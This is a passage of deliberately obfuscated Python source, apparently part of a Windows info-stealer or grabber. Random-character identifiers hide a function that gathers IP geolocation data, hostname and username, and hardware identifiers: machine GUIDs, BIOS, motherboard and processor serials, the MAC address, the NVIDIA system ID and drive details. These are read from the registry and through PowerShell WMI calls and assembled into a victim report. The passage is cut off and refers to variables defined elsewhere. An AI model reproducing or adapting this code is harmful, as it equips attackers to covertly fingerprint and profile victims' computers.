    UKUACAFVDJEARTWELIROTTXEXYUVDESXSXYDWFBHFCNZVYDLHUJKHCUVMDEJOEPZIMEXMNRUCTUMNZMROIIWHDMDEKDGNHF = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('lon', "None")
    SIUMPEWAFVBXIADEKXBYXLJFUVKXNRGYPQRBGDWVOHOLOOHQZK = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('timezone', "None")
    HHNJUZOULUPPAHPPMMTMOHYRBQFGXFIFHNFERYSHBNQQUFCFAJYX = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('isp', "None")
    SZEFFQNXUTHPYIOVSCCVUPMEKUMVYBMWZVMXCPWBGMDCFZXDPWVVAQXHRIREPAPHOXSCHOM = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('org', "None")
    XCHWNTLXGFLHVJYNJKYHCZIZROSLXZOSMLOFNEIAYLLQJFLBBBVJXUQYNNURLJ = OYJUJZTXHJFDFYEOASWKWSLNMCWKYIDKKYAKSAAGCMTFDNZYRAYRNVMRWTZQODDQFL.get('as', "None")

def ABKVDUATQPJVZAZYCYZVGPFMDTGWXETKZCUFXOTJRQZUCBPBCULBKVXUBGR(SQNLPZKZMWBCIJHXNJURZYQBPTDWPYKNJFYKHKCOYFKIEXCRJCYFTHG):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: FKSFKCNFYMWMWLXYPKATYGVEDWOTJBKRUAGBIMRYMDOJDBHZXSBWNWXLH = platform.system()
    except: FKSFKCNFYMWMWLXYPKATYGVEDWOTJBKRUAGBIMRYMDOJDBHZXSBWNWXLH = "None"

    try: VZTKGBQQYJMOXBXQSTUHRYCQOKNJMWFNBMZTQWDJZVHVRTYBSK = platform.version()
    except: VZTKGBQQYJMOXBXQSTUHRYCQOKNJMWFNBMZTQWDJZVHVRTYBSK = "None"

    try: JANKUIPUMRERBMZFBJIRMRFQRWEGFUVUFLSAHHEPYTFTGUWDNDILYSWAKNNBELUZLQVPRWTREQSIEIWOXN = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: JANKUIPUMRERBMZFBJIRMRFQRWEGFUVUFLSAHHEPYTFTGUWDNDILYSWAKNNBELUZLQVPRWTREQSIEIWOXN = "None"

    try: TNCTTSGOISNTWDKSYRNSDKRRUUUSTWHXEOAKLDIJDIOWIQSAVFYNDXEWRAFPUEMLQMIBIHXHGIGONZNLOPLULDORWGYHSJKW = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: TNCTTSGOISNTWDKSYRNSDKRRUUUSTWHXEOAKLDIJDIOWIQSAVFYNDXEWRAFPUEMLQMIBIHXHGIGONZNLOPLULDORWGYHSJKW = "None"

    try: JCTDHCIXUBEZITIDHJESHAOIVERXQVNFOPHXQTTVBFBAJHXIXOFZZBDSEYUEIXZWOPAFVVEBNFJFEEVKWDVAIDMTNOZQORFGDG = platform.processor()
    except: JCTDHCIXUBEZITIDHJESHAOIVERXQVNFOPHXQTTVBFBAJHXIXOFZZBDSEYUEIXZWOPAFVVEBNFJFEEVKWDVAIDMTNOZQORFGDG = "None"

    try: WCYFYWFKLNECPNTORGDZUCHBFSNQERWRISTCALYMLKTPEMDIWYXPCVHFEBYSHVNWPZKRKSHTT = str(psutil.cpu_count(logical=False)) + " Core"
    except: WCYFYWFKLNECPNTORGDZUCHBFSNQERWRISTCALYMLKTPEMDIWYXPCVHFEBYSHVNWPZKRKSHTT = "None"

    try: LCBFRKCSTPFBDJPHQQOYLMWLVKMVHKODJVJQXIIKAYKHPHJXBVRQCQAKCYCVMVNVRQEDNBOAJUR = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: LCBFRKCSTPFBDJPHQQOYLMWLVKMVHKODJVJQXIIKAYKHPHJXBVRQCQAKCYCVMVNVRQEDNBOAJUR = "None"

    QXBRMQTNVERAIPDJIWNGOQCSIAOCMGDSOZZMGHOVNKECZRTZZNLCPIZNIEHZNPUNQJBFWIHCOUEANPTWDEYV                 = r"SOFTWARE\Microsoft\Cryptography"
    SIKDQCWTGWTAKBVIQQWUQMEWTNIAMUNAMETKJEMUOECIYRVRDQBTULFTIWIEYLXHLVKTKVTJWCOARJKVDDGJOJIWLIZGMNJO                    = r"SOFTWARE\Microsoft\SQMClient"
    LGTNWZESKDQUKPSXJNOEMLTKGDDQTBBPOQYJOKJQTIBINPHUDHTDCYTIXHKTZIZXGTYQMZLKRNENBDYJBRCVFTGMP             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    PYAVJKEIVNJYBNYQJFYVYPNMDMAYVLUYWHGDOCHDVACSXCWSYTKTOZ                       = r'SOFTWARE\NVIDIA Corporation'
    AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, QXBRMQTNVERAIPDJIWNGOQCSIAOCMGDSOZZMGHOVNKECZRTZZNLCPIZNIEHZNPUNQJBFWIHCOUEANPTWDEYV, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            RPYMDSNYKAOZKXFCJFFPNGLQOVWUTBQPJOMETYDSTZWLGPKLCPIJKOYPZXGPKIPEUMFZZN = str(v4r_value).replace("{", "").replace("}", "")
    except: RPYMDSNYKAOZKXFCJFFPNGLQOVWUTBQPJOMETYDSTZWLGPKLCPIJKOYPZXGPKIPEUMFZZN = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, LGTNWZESKDQUKPSXJNOEMLTKGDDQTBBPOQYJOKJQTIBINPHUDHTDCYTIXHKTZIZXGTYQMZLKRNENBDYJBRCVFTGMP, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            GNNGDKNUWVWIXTMYJDZYOICUQTZWBYURHCBLLLMZWNCIGUVKFRWIQEVTGMXLMPDESNZP = str(v4r_value).replace("{", "").replace("}", "")
    except: GNNGDKNUWVWIXTMYJDZYOICUQTZWBYURHCBLLLMZWNCIGUVKFRWIQEVTGMXLMPDESNZP = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, LGTNWZESKDQUKPSXJNOEMLTKGDDQTBBPOQYJOKJQTIBINPHUDHTDCYTIXHKTZIZXGTYQMZLKRNENBDYJBRCVFTGMP, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            PBOBBKNHRTESIDNLNEGUHNCNWVPZDARYQCICROCNKDBMNXDYBXTCYYFHAOCRILOWNWSVVYDBCJOTMZRRFX = str(v4r_value).replace("{", "").replace("}", "")
    except: PBOBBKNHRTESIDNLNEGUHNCNWVPZDARYQCICROCNKDBMNXDYBXTCYYFHAOCRILOWNWSVVYDBCJOTMZRRFX = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, SIKDQCWTGWTAKBVIQQWUQMEWTNIAMUNAMETKJEMUOECIYRVRDQBTULFTIWIEYLXHLVKTKVTJWCOARJKVDDGJOJIWLIZGMNJO, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            FORUTUKUDARPXGVLUVSZHTDFORQEGMXPWVHYVIAYZFELTPRMOGQLWRYLEOOQZ = str(v4r_value).replace("{", "").replace("}", "")
    except: FORUTUKUDARPXGVLUVSZHTDFORQEGMXPWVHYVIAYZFELTPRMOGQLWRYLEOOQZ = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, PYAVJKEIVNJYBNYQJFYVYPNMDMAYVLUYWHGDOCHDVACSXCWSYTKTOZ+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            WCYQJROIPAEHKUNYBSGATLMKQCJFIUZOOZQRFVWRSRPZXLDGUFUWAMJZHFWXFEXTUCSN = str(v4r_value).replace("{", "").replace("}", "")
    except: WCYQJROIPAEHKUNYBSGATLMKQCJFIUZOOZQRFVWRSRPZXLDGUFUWAMJZHFWXFEXTUCSN = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            LHASEAWIDHKPRFLNNLLMOKBSYAIPVPXMDXPRIHGZNOFPLHPGPLQVCCWQBMW = str(v4r_value).replace("{", "").replace("}", "")
    except: LHASEAWIDHKPRFLNNLLMOKBSYAIPVPXMDXPRIHGZNOFPLHPGPLQVCCWQBMW = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            HLDUBHUKTJCUDPSAHYFIJYZWJDDBUISTVKOXCUEFXRQMNUFYTDBCALNXEYIJXVMKZQNJBVPORSDRCGSDLLXX = str(v4r_value).replace("{", "").replace("}", "")
    except: HLDUBHUKTJCUDPSAHYFIJYZWJDDBUISTVKOXCUEFXRQMNUFYTDBCALNXEYIJXVMKZQNJBVPORSDRCGSDLLXX = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            DUTIJFTRSXOMXKEFXGDGRURPNIKAMEYXWKSVSWLDQULHTJFGTXVUBOAEMYJKMDRKMNSFXMZUMYJMV = str(v4r_value).replace("{", "").replace("}", "")
    except: DUTIJFTRSXOMXKEFXGDGRURPNIKAMEYXWKSVSWLDQULHTJFGTXVUBOAEMYJKMDRKMNSFXMZUMYJMV = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            DWDETHGVBTKWWWEVNJFMLGKBHRULVBEKQCBXYWTHRUBPGNVMYAVRLINLNRYRQRHORLSZIKVBBUCZKARDE = str(v4r_value).replace("{", "").replace("}", "")
    except: DWDETHGVBTKWWWEVNJFMLGKBHRULVBEKQCBXYWTHRUBPGNVMYAVRLINLNRYRQRHORLSZIKVBBUCZKARDE = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            PNZQADOZCZLGIEPEIZXADMFQZNSPGUQQXEWRODDXBHLNZSEQQLSYBWIOFFBFVT = str(v4r_value).replace("{", "").replace("}", "")
    except: PNZQADOZCZLGIEPEIZXADMFQZNSPGUQQXEWRODDXBHLNZSEQQLSYBWIOFFBFVT = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            NXCWFCBDXPOLQOPJVDFIYKADDMTPFGIEQEYICKWYFHTAPCCBQVNPGPOOIOIX = str(v4r_value).replace("{", "").replace("}", "")
    except: NXCWFCBDXPOLQOPJVDFIYKADDMTPFGIEQEYICKWYFHTAPCCBQVNPGPOOIOIX = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            QKWWLLKJPPMOAOMKSALIJHIMURDFUOYLWNASOYJVHTQAAJRYXLWAMPVGOXFPEBMYWQWITFYASEWSEYYD = str(v4r_value).replace("{", "").replace("}", "")
    except: QKWWLLKJPPMOAOMKSALIJHIMURDFUOYLWNASOYJVHTQAAJRYXLWAMPVGOXFPEBMYWQWITFYASEWSEYYD = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            TLJWZNCNAHQBGKAREATYEDKMUZRJCAHSWDJLYIETAYHRZWYUSMFQNRYMXOKXFGCBJHTRETEU = str(v4r_value).replace("{", "").replace("}", "")
    except: TLJWZNCNAHQBGKAREATYEDKMUZRJCAHSWDJLYIETAYHRZWYUSMFQNRYMXOKXFGCBJHTRETEU = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            CNQUEAJOGNZWNGJSUTQBUALVHWSYFQVDMXEGQRAMLURFAEAJHEHBTBOQHGJHJRZVFLWIUZGCB = str(v4r_value).replace("{", "").replace("}", "")
    except: CNQUEAJOGNZWNGJSUTQBUALVHWSYFQVDMXEGQRAMLURFAEAJHEHBTBOQHGJHJRZVFLWIUZGCB = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, AZIAKEVPHWZEAKSFYNIKUESZSSLITEXHNENXNECYGQFVNKJMWIMYUFNNOLMEVSCGIXADEYNNG, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            MZKUJWVOPZEVSXSJIZSCQQRTMIZQHCJSEFKSYBOQETEEHZGMFYKGCCFTM = str(v4r_value).replace("{", "").replace("}", "")
    except: MZKUJWVOPZEVSXSJIZSCQQRTMIZQHCJSEFKSYBOQETEEHZGMFYKGCCFTM = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: TRGGPXPCJSFECOQCMOQBYRNGNEMGTWIKFYEMSAVYNOOAQNYNEXUZHBXWWPYEHMKIVEVGQKGQAEOAANEFVUPUUPRWS = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: TRGGPXPCJSFECOQCMOQBYRNGNEMGTWIKFYEMSAVYNOOAQNYNEXUZHBXWWPYEHMKIVEVGQKGQAEOAANEFVUPUUPRWS = None

    try: NFLVKLTEDITYOTICGWGCJPWKGANBORIRCWYFPJHDFLRLPRLNGBWLKKVBWGPADATCXBZZPZFJVTTV = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: NFLVKLTEDITYOTICGWGCJPWKGANBORIRCWYFPJHDFLRLPRLNGBWLKKVBWGPADATCXBZZPZFJVTTV = None

    try: TDAVFGHWHRMVBGXVCPHWOCLWGKHWNAIUHKMINBIEMBRTMZEFEF = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: TDAVFGHWHRMVBGXVCPHWOCLWGKHWNAIUHKMINBIEMBRTMZEFEF = None

    try: ZUFIGHSFLFFRYFTHHMHSFZWANMNESKBIMDPCRAQMORKPUQLZUBAXLJGODGGHAGHZDYORWINMCMFCNJXAJNUATMNBHUSAOPZAHKP = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: ZUFIGHSFLFFRYFTHHMHSFZWANMNESKBIMDPCRAQMORKPUQLZUBAXLJGODGGHAGHZDYORWINMCMFCNJXAJNUATMNBHUSAOPZAHKP = None

    try: TSDCRBZNFMBDSZFYTHHGCTDMBWPAKQZWZKKUMWUDNLUAZFHYNBQMOGXAOEPWLKZIGTCUCUHPXJGOIROFQEKVYHUUSKI = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: TSDCRBZNFMBDSZFYTHHGCTDMBWPAKQZWZKKUMWUDNLUAZFHYNBQMOGXAOEPWLKZIGTCUCUHPXJGOIROFQEKVYHUUSKI = None

    try: GJBBHOJBJWJZUVITTWOYLBMGBOORMUXVEZWZUVENIXJWXFFDYVNDCMHVLTMKIXPPAQPOOKOOJOG = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: GJBBHOJBJWJZUVITTWOYLBMGBOORMUXVEZWZUVENIXJWXFFDYVNDCMHVLTMKIXPPAQPOOKOOJOG = None
        
    try:
        BWFVEDUTLJVFWUZPVFOTHULMRHFVYOMEPTQSUATZKCBEMKFDPMKTZNOLREXVLSIERWIEMXZRCJCJNCYGLGMPASXIIBHTFZGFWC = []
        ONUGTADOIMXMTFUDDPUPQKFCTZUNMCCLGXAFBRCQIQMEVBCWEAMXULIOFSY = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if ONUGTADOIMXMTFUDDPUPQKFCTZUNMCCLGXAFBRCQIQMEVBCWEAMXULIOFSY & 1:
                CIWEVHBXBSSLHRYOILBMZAHAFBNUVKHAGMCNFRKNNYBKVXNUVLFFXGMFRGUQIOVGPXWTNDMUTIXHELLEGIZDTO = v4r_letter + ":\\"
                try:
                    PUYOPMDRJBCCVIOIPVORVEHPXQXYXXDVSUILOXPUMKORPYRZBGDEYGFSVBL = ctypes.c_ulonglong(0)
                    DSGWTHIYAGVTCPMELHXOJLDDQKZBRDCMARTBNCAIAWZMLVVTFNGWZKPAQAYYATVIGNZADVSHKEFOQE = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(CIWEVHBXBSSLHRYOILBMZAHAFBNUVKHAGMCNFRKNNYBKVXNUVLFFXGMFRGUQIOVGPXWTNDMUTIXHELLEGIZDTO), None, ctypes.pointer(DSGWTHIYAGVTCPMELHXOJLDDQKZBRDCMARTBNCAIAWZMLVVTFNGWZKPAQAYYATVIGNZADVSHKEFOQE), ctypes.pointer(PUYOPMDRJBCCVIOIPVORVEHPXQXYXXDVSUILOXPUMKORPYRZBGDEYGFSVBL))
                    QBVOEEWDLCNTROQXIHWRIOCOVVKDMWDCIIFNKNTSMHWCKXXGQX = DSGWTHIYAGVTCPMELHXOJLDDQKZBRDCMARTBNCAIAWZMLVVTFNGWZKPAQAYYATVIGNZADVSHKEFOQE.value
                    OHHGGSNXLRSEJTFMRLCIMKEQWOPSKOEVXLYWKCKGNUXYJEZKXNSHJJHJ = PUYOPMDRJBCCVIOIPVORVEHPXQXYXXDVSUILOXPUMKORPYRZBGDEYGFSVBL.value
                    PTFJGNUQJFKJFYSWMBEFHRCQZGFFUWSPSMYESXYICZDVHFBVZUVNRTZOUIIAHWXSOBEAST = QBVOEEWDLCNTROQXIHWRIOCOVVKDMWDCIIFNKNTSMHWCKXXGQX - OHHGGSNXLRSEJTFMRLCIMKEQWOPSKOEVXLYWKCKGNUXYJEZKXNSHJJHJ
                    RWDCXOZEPFNMDTGZOEUSMNFORFVQGHWUQKBTGFCRUYRPQHYWTEAOVQRFNNJVZGLSWKICQHJXBZAZXNNGUCTDYPY = win32api.GetVolumeInformation(CIWEVHBXBSSLHRYOILBMZAHAFBNUVKHAGMCNFRKNNYBKVXNUVLFFXGMFRGUQIOVGPXWTNDMUTIXHELLEGIZDTO)[0]
                    drive = {
                        'drive': CIWEVHBXBSSLHRYOILBMZAHAFBNUVKHAGMCNFRKNNYBKVXNUVLFFXGMFRGUQIOVGPXWTNDMUTIXHELLEGIZDTO,
                        'total': QBVOEEWDLCNTROQXIHWRIOCOVVKDMWDCIIFNKNTSMHWCKXXGQX,
                        'free': OHHGGSNXLRSEJTFMRLCIMKEQWOPSKOEVXLYWKCKGNUXYJEZKXNSHJJHJ,
                        'used': PTFJGNUQJFKJFYSWMBEFHRCQZGFFUWSPSMYESXYICZDVHFBVZUVNRTZOUIIAHWXSOBEAST,
                        'name': RWDCXOZEPFNMDTGZOEUSMNFORFVQGHWUQKBTGFCRUYRPQHYWTEAOVQRFNNJVZGLSWKICQHJXBZAZXNNGUCTDYPY,
                    }
                    BWFVEDUTLJVFWUZPVFOTHULMRHFVYOMEPTQSUATZKCBEMKFDPMKTZNOLREXVLSIERWIEMXZRCJCJNCYGLGMPASXIIBHTFZGFWC.append(drive)
                except:
                    ()
            ONUGTADOIMXMTFUDDPUPQKFCTZUNMCCLGXAFBRCQIQMEVBCWEAMXULIOFSY >>= 1

        GZCQELQHTLFHULVTRINGAIVDTLYATVDYSMVPOTSFHSYHEHWZIJOBQUZDFKCFNNHEWFTRBIBFQAJRORJODEWMDMXVEQKORIYW = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in BWFVEDUTLJVFWUZPVFOTHULMRHFVYOMEPTQSUATZKCBEMKFDPMKTZNOLREXVLSIERWIEMXZRCJCJNCYGLGMPASXIIBHTFZGFWC:
            ZKVIQEAVGUQHKXLGHBNNFONLGJZGJWUOAODTLSIDVIYCTGRBCVBVI = (v4r_drive['used'] / v4r_drive['total']) * 100
            OHHGGSNXLRSEJTFMRLCIMKEQWOPSKOEVXLYWKCKGNUXYJEZKXNSHJJHJ_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            QBVOEEWDLCNTROQXIHWRIOCOVVKDMWDCIIFNKNTSMHWCKXXGQX_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            ZKVIQEAVGUQHKXLGHBNNFONLGJZGJWUOAODTLSIDVIYCTGRBCVBVI_str = "{:.2f}%".format(ZKVIQEAVGUQHKXLGHBNNFONLGJZGJWUOAODTLSIDVIYCTGRBCVBVI)
            GZCQELQHTLFHULVTRINGAIVDTLYATVDYSMVPOTSFHSYHEHWZIJOBQUZDFKCFNNHEWFTRBIBFQAJRORJODEWMDMXVEQKORIYW += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   OHHGGSNXLRSEJTFMRLCIMKEQWOPSKOEVXLYWKCKGNUXYJEZKXNSHJJHJ_gb,
                                                                   QBVOEEWDLCNTROQXIHWRIOCOVVKDMWDCIIFNKNTSMHWCKXXGQX_gb,
                                                                   ZKVIQEAVGUQHKXLGHBNNFONLGJZGJWUOAODTLSIDVIYCTGRBCVBVI_str,
                                                                   v4r_drive['name'])
    except:
        GZCQELQHTLFHULVTRINGAIVDTLYATVDYSMVPOTSFHSYHEHWZIJOBQUZDFKCFNNHEWFTRBIBFQAJRORJODEWMDMXVEQKORIYW = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            AAHVWDMGYGCSMALJKQIWAFJXDPDFEXKEXOXGQWJMWBSTGQSGJZTAQDTNOANIULRKJ = 'Pc Portable'
        else:
            AAHVWDMGYGCSMALJKQIWAFJXDPDFEXKEXOXGQWJMWBSTGQSGJZTAQDTNOANIULRKJ = 'Pc Fixed'
    except:
        AAHVWDMGYGCSMALJKQIWAFJXDPDFEXKEXOXGQWJMWBSTGQSGJZTAQDTNOANIULRKJ = "None"

    try: HLQZQFDBCJBYUPFVQFPNSSJHQREWDKYOIWEKVNJJUZKHMPWPDTSMKFBQEPJKFOYPKYYFSFTFKYSLTOAWNHGQQHBZGTSK = len(screeninfo.get_monitors())
    except: HLQZQFDBCJBYUPFVQFPNSSJHQREWDKYOIWEKVNJJUZKHMPWPDTSMKFBQEPJKFOYPKYYFSFTFKYSLTOAWNHGQQHBZGTSK = "None"

    BTFQTIOHOHJDUBTAJCMGMUQBCRJHNULNTMPJRIHBZBFBJXQSEBEVHSTHMD_system_info = "Yes"
    XYHTNOBMKCQIXVAWMKKWRLCMCEAFVXCCWXLDCGGYPITWGFAUGTTIGQDELCXOPKHZLLWDVWWWVKBHNTCHZDT = f"""
User Pc:
 - Hostname    : {TLEDMMOGLTNSNDNFJOADBHXIUGUFJSXLTZWFOMPIPGTJQTZOHSMUZKWXSEFNECSCCCIIKFKGSFTPYAOETTZ}
 - Username    : {YSMCCAMVSVJXNGQIPOBNLGWANJHAADXJIAQSHZNTREYKAVKRJJZODGQUDJHTUBGDWWKMSZUTTXSXC}
 - DisplayName : {FRAPRNPUJDTUFUDBUDMDWJQZEOZWWNXSKCFOJZJCBJRSPUFGUJTFHRWHFMLJTPKBRLWAXMCHNEEVI}

System:
 - Plateform     : {AAHVWDMGYGCSMALJKQIWAFJXDPDFEXKEXOXGQWJMWBSTGQSGJZTAQDTNOANIULRKJ}
 - Exploitation  : {FKSFKCNFYMWMWLXYPKATYGVEDWOTJBKRUAGBIMRYMDOJDBHZXSBWNWXLH} {VZTKGBQQYJMOXBXQSTUHRYCQOKNJMWFNBMZTQWDJZVHVRTYBSK}
 - Screen Number : {HLQZQFDBCJBYUPFVQFPNSSJHQREWDKYOIWEKVNJJUZKHMPWPDTSMKFBQEPJKFOYPKYYFSFTFKYSLTOAWNHGQQHBZGTSK}

Peripheral:
 - CPU : {JCTDHCIXUBEZITIDHJESHAOIVERXQVNFOPHXQTTVBFBAJHXIXOFZZBDSEYUEIXZWOPAFVVEBNFJFEEVKWDVAIDMTNOZQORFGDG}, {WCYFYWFKLNECPNTORGDZUCHBFSNQERWRISTCALYMLKTPEMDIWYXPCVHFEBYSHVNWPZKRKSHTT} 
 - GPU : {LCBFRKCSTPFBDJPHQQOYLMWLVKMVHKODJVJQXIIKAYKHPHJXBVRQCQAKCYCVMVNVRQEDNBOAJUR}
 - RAM : {TNCTTSGOISNTWDKSYRNSDKRRUUUSTWHXEOAKLDIJDIOWIQSAVFYNDXEWRAFPUEMLQMIBIHXHGIGONZNLOPLULDORWGYHSJKW}

Disk:
{GZCQELQHTLFHULVTRINGAIVDTLYATVDYSMVPOTSFHSYHEHWZIJOBQUZDFKCFNNHEWFTRBIBFQAJRORJODEWMDMXVEQKORIYW}

Serial Number:
 - MAC                       : {JANKUIPUMRERBMZFBJIRMRFQRWEGFUVUFLSAHHEPYTFTGUWDNDILYSWAKNNBELUZLQVPRWTREQSIEIWOXN}
 - Machine Id                : {FORUTUKUDARPXGVLUVSZHTDFORQEGMXPWVHYVIAYZFELTPRMOGQLWRYLEOOQZ}
 - Machine Guid              : {RPYMDSNYKAOZKXFCJFFPNGLQOVWUTBQPJOMETYDSTZWLGPKLCPIJKOYPZXGPKIPEUMFZZN}
 - Hw Profile Guid           : {PBOBBKNHRTESIDNLNEGUHNCNWVPZDARYQCICROCNKDBMNXDYBXTCYYFHAOCRILOWNWSVVYDBCJOTMZRRFX}
 - Nvidia System Id          : {WCYQJROIPAEHKUNYBSGATLMKQCJFIUZOOZQRFVWRSRPZXLDGUFUWAMJZHFWXFEXTUCSN}
 - Guid Serial Number        : {GNNGDKNUWVWIXTMYJDZYOICUQTZWBYURHCBLLLMZWNCIGUVKFRWIQEVTGMXLMPDESNZP}
 - Uuid Serial Number        : {TRGGPXPCJSFECOQCMOQBYRNGNEMGTWIKFYEMSAVYNOOAQNYNEXUZHBXWWPYEHMKIVEVGQKGQAEOAANEFVUPUUPRWS}
 - Motherboard Serial Number : {TDAVFGHWHRMVBGXVCPHWOCLWGKHWNAIUHKMINBIEMBRTMZEFEF}
 - Motherboard Product       : {LHASEAWIDHKPRFLNNLLMOKBSYAIPVPXMDXPRIHGZNOFPLHPGPLQVCCWQBMW}
 - Motherboard Manufacturer  : {HLDUBHUKTJCUDPSAHYFIJYZWJDDBUISTVKOXCUEFXRQMNUFYTDBCALNXEYIJXVMKZQNJBVPORSDRCGSDLLXX}
 - Processor Serial Number   : {ZUFIGHSFLFFRYFTHHMHSFZWANMNESKBIMDPCRAQMORKPUQLZUBAXLJGODGGHAGHZDYORWINMCMFCNJXAJNUATMNBHUSAOPZAHKP}
 - Bios Serial Number        : {NFLVKLTEDITYOTICGWGCJPWKGANBORIRCWYFPJHDFLRLPRLNGBWLKKVBWGPADATCXBZZPZFJVTTV}
 - Bios Release Date         : {DUTIJFTRSXOMXKEFXGDGRURPNIKAMEYXWKSVSWLDQULHTJFGTXVUBOAEMYJKMDRKMNSFXMZUMYJMV}
